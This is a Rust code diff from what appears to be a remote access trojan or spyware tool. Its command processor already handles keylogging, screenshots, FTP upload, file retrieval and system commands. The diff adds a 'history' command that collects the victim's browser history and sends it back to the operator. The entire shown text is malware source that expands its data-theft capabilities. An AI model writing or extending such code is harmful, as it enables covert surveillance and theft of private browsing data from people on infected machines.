@@ -9,7 +9,7 @@ use log::{debug, error};
 use chrono::{DateTime, Utc};
 use crate::fileserver::FileServer;
 use crate::{ftp::*, screenshot::Screenshot};
-use crate::systemcmd::*;
+use crate::{systemcmd::*, browserhistory};
 use crate::keylogger::*;
 
 const FLEA_PROTOCOL_VERSION: u8 = 1;
@@ -25,6 +25,7 @@ const DIR_COMMAND: &'static str = "dir";
 const GET_FILE_COMMAND: &'static str = "getfile";
 const CHANGE_DIRECTORY_COMMAND: &'static str = "cd";
 const FTP_PARAM_COMMAND: &'static str = "setftp";
+const BROWSING_HISTORY_COMMAND: &'static str = "history";
 pub const STOP_COMMAND: &'static str = "quit";
 const UNKNOWN_COMMAND: &'static str = "Unknown command";
 
@@ -381,6 +382,21 @@ impl FleaCommand for CommandProcessor
                     Ok(_) =>
                     {
                         return "Ok".to_string();
+                    },
+                    Err(x) =>
+                    {
+                        return x.to_string();
+                    }
+                }
+            },
+
+            BROWSING_HISTORY_COMMAND =>
+            {
+                match browserhistory::get_browsing_history()
+                {
+                    Ok(x) =>
+                    {
+                        return self.vec_to_string(&x);
                     },
                     Err(x) =>
                     {
